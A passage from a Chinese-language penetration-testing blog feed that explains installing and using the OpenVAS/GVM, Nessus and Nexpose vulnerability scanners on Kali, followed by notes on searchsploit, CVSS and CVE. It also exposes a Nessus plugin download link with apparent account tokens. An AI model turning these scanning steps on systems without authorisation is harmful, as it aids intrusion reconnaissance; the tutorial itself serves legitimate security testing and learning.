src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221215175500147.png" alt="image-20221215175500147"></p></li><li><blockquote><p>如果已知目标主机帐号密码可以使用脚本参数<code>--script-args=smbuser=admin,smbpassword=pass</code>登录查看是否开启共享打印机；若未知帐号密码直接使用枚举脚本即可。</p></blockquote></li></ul></li></ul></li></ul><h2 id="OPENVAS"><a href="#OPENVAS" class="headerlink" title="OPENVAS"></a>OPENVAS</h2><blockquote><ul><li>Openvas<ul><li>Nessus项目分支</li><li>管理目标系统的漏洞</li><li>免费开源</li><li>Kali默认安装，但未配置和启动</li></ul></li><li>OpenVAS介绍<ul><li>是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。</li></ul></li><li>Openvas架构<ul><li>OpenVAS是一个客户端&#x2F;服务器架构，它由几个组件组成。在服务器上（仅限于Linux），用户需要四个程序包：<ul><li>OpenVAS-Server: 实现基本的扫描功能</li><li>OpenVAS-Plugins: 一套网络漏洞测试程序</li><li>OpenVAS-LibNASL 和OpenVAS-Libraries: 实现服务器功能所需要的组件</li><li>而在客户端上（Windows或Linux均可），用户仅需要OpenVAS客户端。</li></ul></li></ul></li><li>官网<ul><li><a href="https://www.openvas.org/">https://www.openvas.org/</a></li><li>OpenVAS从10版本后改名GVM</li></ul></li></ul></blockquote><h3 id="OPENVAS架构"><a href="#OPENVAS架构" class="headerlink" title="OPENVAS架构"></a>OPENVAS架构</h3><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216105102487.png" alt="image-20221216105102487"></p><blockquote><ul><li>OpenVAS Manager<ul><li>控制scanner和其他manager的中心组件</li><li>控制中心数据库，保存用户配置及扫描结果</li><li>客户端使用基于XML的无状态OMP协议与其通信</li><li>集中排序筛选，使客户端获得一致展现&#x2F;olos.odn</li></ul></li><li>OpenVAS Scanner<ul><li>具体执行Network Vulnerability Tests (NVTS)</li><li>NVTs 每天通过Feed 更新</li><li>受 Manager 控制</li></ul></li><li>OSP Scanner<ul><li>可以统一管理多个scanner</li><li>将一组 scanner 作为一个对象交给manager管理</li></ul></li><li>Greenbone Security Assistant (GSA)<ul><li>提供Web servise</li></ul></li><li>OpenVAS CLI<ul><li>omp命令行工具，可实现批处理控制manager</li></ul></li><li>更新更快<ul><li>所有找得到的资料几乎都已不同程度的过时了</li></ul></li></ul></blockquote><h3 id="配置Openvas"><a href="#配置Openvas" class="headerlink" title="配置Openvas"></a>配置Openvas</h3><ul><li><p>安装GVM</p><ul><li><p>apt-get install gvm -y</p></li><li><p>gvm-setup</p><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216102117712.png" alt="image-20221216102117712"></p></li><li><blockquote><p>出现报错，查看一下报错信息</p></blockquote><ul><li><p>pg_lsclusters</p><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216102211364.png" alt="image-20221216102211364"></p></li><li><blockquote><p>GVM启动时postgresql默认使用端口5432</p></blockquote></li><li><p>修改端口</p></li></ul><p><code>mousepad /etc/postgresql/13/main/postgresql.conf   # 将13的端口修改为5433</code><br><code>mousepad /etc/postgresql/15/main/postgresql.conf   # 将15的端口修改为5432</code></p><ul><li>重启pgsql服务：systemctl restart postgresql</li></ul><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217225324890.png" alt="image-20221217225324890"></p></li><li><p>重新运行gvm-setup</p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216102943371.png" alt="image-20221216102943371"></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216110808665.png" alt="image-20221216110808665"></p></li></ul></li></ul></li><li><p>gvm-check-setup</p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216111130052-1671160291421-1.png" alt="image-20221216111130052"></p><ul><li><p>出现报错</p></li><li><p>使用<code>chmod 666 /var/log/gvm/openvas.log</code>修改日志文件权限，再次验证</p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216111335002.png" alt="image-20221216111335002"></p></li></ul></li><li><p>配置外部监听</p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216173531528.png" alt="image-20221216173531528"></p></li></ul></li><li><p>基本命令</p><ul><li><code>gvm-start    #启动openvas</code><br><code>gvm-stop     #停止openvas     gvm-check-setup  #升级特征库  第一次安装，不用升级。后期使用记得经常升级特征库。</code></li></ul></li><li><p>基本配置</p><ul><li><p><code>sudo runuser -u _gvm -- gvmd --user=admin --new-password=password  #修改密码</code><br><code>sudo runuser -u _gvm -- gvmd --create-user=admin2 --new-password=123456  #创建新的管理员</code></p></li><li><p><code>配置文件路径</code></p><ul><li><code>/lib/systemd/system/greenbone-security-assistant.service</code></li></ul></li></ul></li><li><p><code>https://127.0.0.1:9392</code></p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216113109190.png" alt="image-20221216113109190"></li></ul></li></ul><h2 id="OPENVAS使用"><a href="#OPENVAS使用" class="headerlink" title="OPENVAS使用"></a>OPENVAS使用</h2><h3 id="Scans"><a href="#Scans" class="headerlink" title="Scans"></a>Scans</h3><p><strong>1、向导</strong></p><ul><li><p>Task Wizard</p><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216174304612.png" alt="image-20221216174304612"></p><blockquote><ul><li>Task Wizard     任务向导（默认向导）</li><li>Advanced Task Wizard   高级任务向导</li><li>Modify Task Wizard        自定义任务向导</li></ul></blockquote></li><li><p>任务向导（默认向导：使最少的用户输入自己的配置并启动基本扫描）</p><ul><li><blockquote><p>在输入框中输入目标系统的IP地址或主机名</p><p>点击<em>Start Scan</em> ：</p><p>→ 任务向导自动执行以下步骤：</p><ol><li>在设备上创建新的扫描目标。</li><li>在设备上创建新的扫描任务。</li><li>立即启动扫描任务。</li><li>显示页面<em>任务</em> .</li></ol></blockquote></li><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216175029600.png" alt="image-20221216175029600"></p></li><li><blockquote><p>任务启动后，可以查看进度</p></blockquote></li><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216175455240.png" alt="image-20221216175455240"></p></li></ul></li><li><p>高级任务向导</p><ul><li><blockquote><p>除了简单向导之外，该设备还提供了一个高级向导，允许使用更多配置选项。</p></blockquote></li><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216180233839.png" alt="image-20221216180233839"></p></li></ul></li><li><p>向导修改任务（其他向导可以修改现有任务）</p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216181309637.png" alt="image-20221216181309637"></li></ul></li></ul></li><li><p>创建任务并配置</p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216181943818.png" alt="image-20221216181943818"></li><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216184328245.png" alt="image-20221216184328245"></li></ul></li></ul><p><strong>2、Reports</strong></p><blockquote><p>扫描结果报告</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216185024722.png" alt="image-20221216185024722"></p><p><strong>3、Results</strong></p><blockquote><p>扫描结果</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216220835525.png" alt="image-20221216220835525"></p><p><strong>4、Vulnerabilities</strong></p><blockquote><p>漏洞列表</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216220929175.png" alt="image-20221216220929175"></p><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h3><blockquote><p>配置一栏主要是<code>Scan Configs</code>需要详细了解</p></blockquote><p><strong>Scan Configs</strong></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216221203366.png" alt="image-20221216221203366"></p><ul><li><p>新建扫描配置</p><blockquote><p>可以选择Openvas给定的三种扫描方式</p></blockquote><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216221411306.png" alt="image-20221216221411306"></li></ul></li><li><p>编辑新建的扫描配置</p><blockquote><p>可以自定义NVTs，选择对应的NVTs进行扫描；例如：扫描windowsOS可以只选择windows类型的NVTs；扫描LinuxOS选择Linux类型的NVTs。</p></blockquote><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216222232684.png" alt="image-20221216222232684"></p></li><li><blockquote><p>其中Trend一栏：</p><p>↗表示编辑完配置文件之后自动将官方后续更新的NVT集添加到已配置完成的配置文件中；➡表示只保存当前配置的NVT集，后续官方若有新的NVT更新，则不会自动添加到已配置完成的配置文件中</p></blockquote></li></ul></li></ul><p>**Targets **</p><blockquote><p>定义好配置文件之后，就需要设置扫描目标</p></blockquote><ul><li>新建扫描目标<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216224542261.png" alt="image-20221216224542261"></li><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216224936660.png" alt="image-20221216224936660"></li></ul></li></ul><p><strong>Port Lists</strong></p><blockquote><p>自定义端口列表，或者使用默认端口列表</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221216233759396.png" alt="image-20221216233759396"></p><p><strong>注意：扫描器只是辅助作用，每个扫描使用的扫描方法可能不同，扫描出的结果未必是准确的，存在误报，漏报，渗透测试者需要自行判断出是否真的存在扫描出的漏洞</strong></p><h2 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a>NESSUS</h2><blockquote><ul><li>家庭版<ul><li>免费</li></ul></li><li>专业版<ul><li>收费，无限的并发连接</li></ul></li><li>下载<ul><li><a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">https://www.tenable.com/downloads/nessus?loginAttempted=true</a></li></ul></li></ul></blockquote><h3 id="Kali-安装Nessus"><a href="#Kali-安装Nessus" class="headerlink" title="Kali-安装Nessus"></a>Kali-安装Nessus</h3><ul><li><p>官网下载基于Debian的Nessus安装包</p></li><li><p>基于deb的安装包不需要使用<code>apt-get</code>命令，使用<code>dpkg</code></p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217103327358.png" alt="image-20221217103327358"></li></ul></li><li><p>启动Nessus</p><ul><li>&#x2F;bin&#x2F;systemctl start nessusd.service<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217103613527.png" alt="image-20221217103613527"></li></ul></li></ul></li><li><p>获取激活码</p><ul><li><a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials%E8%AE%BF%E9%97%AE%E5%AE%98%E7%BD%91%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%86%8C%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E7%A0%81">https://zh-cn.tenable.com/products/nessus/nessus-essentials访问官网进行注册获取注册码</a><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217105631034.png" alt="image-20221217105631034"></li></ul></li></ul></li><li><p>激活</p><ul><li><p>kali中输入下面命令</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli fetch  --challenge <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217105819493.png" alt="image-20221217105819493"></li></ul></li><li><p>将得到的challenge code复制粘贴到对应网址中</p><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217110148242.png" alt="image-20221217110148242"></p></li><li><blockquote><p>第一个输入框填challenge code，第二个输入框填邮箱得到的activation code</p></blockquote></li></ul></li><li><p>得到插件和证书下载地址</p><ul><li><a href="https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&u=4bd4b4a84a094d9c6d549da2e1b3fcde&p=6e4b71afbd6f74e272fd54824dce5242">https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;u=4bd4b4a84a094d9c6d549da2e1b3fcde&amp;p=6e4b71afbd6f74e272fd54824dce5242</a><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217110457416.png" alt="image-20221217110457416"></li><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217110652296.png" alt="image-20221217110652296"></li></ul></li></ul></li></ul></li><li><p>将许可证和证书上传到kali，移动到Nessus目录下</p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217110952731.png" alt="image-20221217110952731"></li><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217111228982.png" alt="image-20221217111228982"></li></ul></li><li><p>输入命令进行离线激活</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli fetch --register-offline .&#x2F;nessus.license<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217111409384.png" alt="image-20221217111409384"></p></li><li><blockquote><p>出现上面的提示表示激活成功</p></blockquote></li></ul></li><li><p>更新插件包</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli update .&#x2F;all-2.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217111722333.png" alt="image-20221217111722333"></li></ul></li><li><p>重启nessus服务</p><ul><li>service nessusd restart<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221217112428221.png" alt="image-20221217112428221"></li></ul></li></ul></li><li><p>重新打开web页面即可</p></li></ul><h3 id="Nessus使用"><a href="#Nessus使用" class="headerlink" title="Nessus使用"></a>Nessus使用</h3><blockquote><p>Nessus主要针对于主机的扫描，对于Web应用的扫描很薄弱</p></blockquote><h4 id="新建扫描"><a href="#新建扫描" class="headerlink" title="新建扫描"></a>新建扫描</h4><h4 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h4><ul><li><p>创建新策略</p><ul><li><p>选择<code>Policies</code>点击 <code>scan templates</code>填写扫描信息保存</p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218103851906.png" alt="image-20221218103851906"></p></li><li><p>查看扫描状态及结果</p></li></ul><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218104514570.png" alt="image-20221218104514570"></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218104532675.png" alt="image-20221218104532675"></p><blockquote><p>若想重新配置扫描信息可以点击右上角<code>Configure</code></p></blockquote><ul><li><p>Notifications</p><blockquote><p>将邮箱添加到输入框中，接收扫描结果报告</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218173609878.png" alt="image-20221218173609878"></p><blockquote><p>配置SMTP Server，其中需要在邮箱中开启SMTP服务，再输入授权码才能收到邮件。</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218174756802.png" alt="image-20221218174756802"></p></li></ul></li><li><p>发现</p><ul><li><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218105225495.png" alt="image-20221218105225495"></p><blockquote><p>发现栏中可以配置主机发现，端口扫描，服务发现以及从域服务中收集身份信息</p></blockquote></li></ul></li><li><p>网络唤醒(Wake-on-LAN)</p><blockquote><p>其中主机发现当中有Wake-on-LAN选项，即使目标主机关机，可以使用Wake-on-LAN选项进行将目标主机唤醒；其中需要添加<code>List of MAC addresses</code>文件，Nessus会通过这些MAC地址对目标主机发送网络唤醒的指令，唤醒需要设置等待时间，等待目标主机彻底启动之后接着扫描。</p></blockquote></li></ul><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218105923409.png" alt="image-20221218105923409"></p><h4 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h4><blockquote><p>Credential一栏，若是已知目标系统的帐号密码，可以在这一栏添加目标系统的帐号密码，Nessus使用帐号密码登录到目标系统进行深度性的扫描，结果会更准确</p></blockquote><p><strong>主机扫描</strong></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218111703209.png" alt="image-20221218111703209"></p><p><strong>数据库扫描</strong></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218112413499.png" alt="image-20221218112413499"></p><p><strong>所有能够扫描的设备</strong></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218111828586.png" alt="image-20221218111828586"></p><h4 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h4><blockquote><p>Plugins选项，挑选需要扫描的插件进行选择，最终Save保存为新策略</p></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218113839228.png" alt="image-20221218113839228"></p><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221218114046479.png" alt="image-20221218114046479"></p><blockquote><p>Openvas是Nessus的分支，操作起来和Nessus差不多。</p></blockquote><h2 id="NEXPOSE"><a href="#NEXPOSE" class="headerlink" title="NEXPOSE"></a>NEXPOSE</h2><blockquote><ul><li>Rapid7 Nexpose<ul><li>领先的漏洞评估工具之一</li><li>一款面向大型网络组织的安全风险智能解决方案</li><li>主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。</li><li>需要使用企业邮箱激活</li><li>免费试用 30天</li><li>下载地址：<a href="https://www.rapid7.com/products/nexpose/download/">https://www.rapid7.com/products/nexpose/download/</a></li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞扫描 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-漏洞扫描概念</title>
      <link href="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A6%82%E5%BF%B5/"/>
      <url>/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="发现弱点"><a href="#发现弱点" class="headerlink" title="发现弱点"></a>发现弱点</h2><blockquote><ul><li>发现漏洞<ul><li>基于端口服务扫描结果版本信息（速度慢）</li><li>搜索已公开的漏洞数据库<ul><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li></ul></li><li>使用漏洞扫描器实现漏洞管理</li></ul></li></ul></blockquote><h2 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h2><blockquote><p>由于在各大网站搜索漏洞会很不方便导致花费大量的实践，可以使用集成的漏洞搜索库</p></blockquote><ul><li><p>searchsploit tomcat</p><ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A6%82%E5%BF%B5/image-20221215093409404.png" alt="image-20221215093409404"></li></ul></li><li><p>漏洞库目录</p><ul><li>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A6%82%E5%BF%B5/image-20221215093721583.png" alt="image-20221215093721583"></li></ul></li></ul></li></ul><h2 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h2><blockquote><h4 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h4><ul><li>有身份验证</li><li>无身份验证</li></ul><h4 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h4><ul><li>镜像端口抓包</li><li>其他来源输入</li></ul><h4 id="基于Agent的扫描"><a href="#基于Agent的扫描" class="headerlink" title="基于Agent的扫描"></a>基于Agent的扫描</h4><ul><li>支持平台有限</li></ul></blockquote><h2 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h2><h3 id="CVSS"><a href="#CVSS" class="headerlink" title="CVSS"></a>CVSS</h3><blockquote><ul><li>CVSS（Common Vulnerability Scoring System）<ul><li>通用漏洞评分系统—工业标准</li><li>描述安全漏洞严重程度的统一评分方案</li><li>目前版本V3.1</li><li>Basic Metric：基础的恒定不变的弱点权重</li><li>Temporal Metric：依赖时间因素的弱点权重</li><li>Enviromental Metric：利用弱点的环境要求和实施难度的权重</li></ul></li></ul></blockquote><blockquote><ul><li>CVSS（Common Vulnerability Scoring System）<ul><li>CVSS是安全内容自动化协议（SCAP）的一部分</li><li>通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新</li><li>分值范围：0—10</li><li>不同机构按CVSS分值定义威胁的低，中，高威胁级别</li><li>CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度</li><li>CVSS分值是工业标准，但威胁级别不是</li></ul></li></ul></blockquote><p><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A6%82%E5%BF%B5/image-20221215102739260.png" alt="image-20221215102739260"></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><blockquote><ul><li>Vulnerability Reference</li><li>CVE ( Common Vulnerabilities and Exposure )<ul><li>己公开的信息安全漏洞字典，统一的漏洞编号标准</li><li>MITRE公司负责维护（非盈利机构）</li><li>扫描器的大部分扫描项都对应一个CVE编号</li><li>实现不同厂商之间信息交换的统一标准</li></ul></li><li>CVE发布流程<ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List—CVE-2008-4250</li><li>MITRE负责对内容进行编辑维护</li></ul></li></ul></blockquote><h3 